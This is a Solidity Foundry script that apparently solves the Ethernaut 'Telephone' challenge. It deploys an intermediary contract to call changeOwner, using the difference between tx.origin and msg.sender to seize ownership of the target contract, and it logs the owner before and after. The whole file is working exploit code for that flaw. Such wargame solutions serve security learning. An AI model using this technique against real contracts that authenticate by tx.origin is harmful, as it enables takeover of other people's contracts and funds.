// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Telephone.sol";

contract Caller {
    Telephone public telephone = Telephone(0x3C0B24955dFeF37A969546b4FA1Ab698B1d8bb38);

    function changeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }

}

contract TelephoneScript is Script {

    Telephone public telephone = Telephone(0x3C0B24955dFeF37A969546b4FA1Ab698B1d8bb38);

    Caller caller = new Caller();

    /**
     * Solution: tx.origin is always the initiator of the transaction, which means the EOA
     * msg.sender is the address of the account from which the current call is coming.
     * It can be either a EOA or a smart contract accout.
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("1. Owner before attack", telephone.owner());
        caller.changeOwner(vm.envAddress("WALLLET_ADDRESS"));
        console.log("2. Owner after attack", telephone.owner());

        vm.stopBroadcast();
    }
}
